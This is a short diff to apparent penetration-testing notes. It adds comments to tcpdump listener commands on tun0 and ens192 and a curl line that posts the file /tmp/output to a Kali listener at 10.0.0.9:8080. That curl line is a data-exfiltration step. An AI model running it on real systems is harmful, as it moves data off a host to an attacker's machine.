@@ -1,3 +1,8 @@
+# listen on tun0 for TCP on port 8080:
 sudo tcpdump -nvvvXi tun0 tcp port 8080
 
+# transfer output file to a tcpdump listening 8080 port on Kali:
 curl --data @/tmp/output http://10.0.0.9:8080/
+
+# listen on ens192 for DNS communications:
+sudo tcpdump -i ens192 udp port 53
